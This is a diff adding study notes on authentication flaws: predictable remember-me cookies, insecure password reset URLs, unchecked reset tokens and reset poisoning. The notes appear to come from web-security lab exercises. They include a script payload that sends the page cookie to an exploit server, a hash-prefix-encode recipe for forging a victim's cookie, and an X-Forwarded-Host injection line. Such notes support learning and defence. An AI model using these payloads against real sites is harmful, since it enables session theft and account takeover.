@@ -114,5 +114,48 @@ When submitting the verification code, the request uses this cookie to determine
    In HTTP basic authentication, the client receives an authentication token from the server, which is constructed by concatenating the username and password, and encoding it in Base64. This token is stored and managed by the browser, which automatically adds it to the Authorization header of every subsequent request as follows:
   
    Authorization: Basic base64(username:password)
+     
+                      ## Keeping users logged in
+  This functionality is often implemented by generating a "remember me" token of some kind, which is then stored in a persistent cookie.
+  
+  Some websites generate this cookie based on a predictable concatenation of static values, such as the username and a timestamp.
+  
+  Some even use the password as part of the cookie.
+  
+  This approach is particularly dangerous if an attacker is able to create their own account because they can study their own cookie and potentially deduce how it is generated.
+  
+  username+':'+md5HashOfPassword
+  
+           Hash:MD5
+           prefix:carlos:
+           encode:base64
+           
+  <script>document.location='//your-exploit-server-id.web-security-academy.net/'+document.cookie</script>
+  
+                 ## Resetting user passwords
+   There are a few different ways that this feature is commonly implemented, with varying degrees of vulnerability. 
+   1.1 # Sending passwords by email
+   ---->Generally speaking, sending persistent passwords over insecure channels is to be avoided.
+    
+   1.2 # Resetting passwords using a URL
+   ---->http://vulnerable-website.com/reset-password?user=victim-user
+       In this example, an attacker could change the user parameter to refer to any username they have identified. They would then be taken straight to a page where they can potentially set a new password for this arbitrary user. 
+
+   A better implementation of this process is to generate a high-entropy, hard-to-guess token and create the reset URL based on that. In the best case scenario, this URL should provide no hints about which user's password is being reset. 
+   http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8
    
+   When the user visits this URL, the system should check whether this token exists on the back-end and, if so, which user's password it is supposed to reset.
+   This token should expire after a short period of time and be destroyed immediately after the password has been reset. 
    
+   However, some websites fail to also validate the token again when the reset form is submitted.
+   In this case, an attacker could simply visit the reset form from their own account, delete the token, and leverage this page to reset an arbitrary user's password. 
+
+   NOTE:Some website provide the temporary token during the reseting process, but this token doesnot being checed during the submission of a new password.
+   
+    ## If the URL in the reset email is generated dynamically, this may also be vulnerable to password reset poisoning. In this case, an attacker can potentially steal another user's token and use it change their password. 
+   
+       Example:X-Forwarded-Host: //exploit-ac461f051f9c8e19c08b0377010000f4.web-security-academy.net
+       
+       1.1 # Changing user passwords
+    Password change functionality can be particularly dangerous if it allows an attacker to access it directly without being logged in as the victim user.
+    
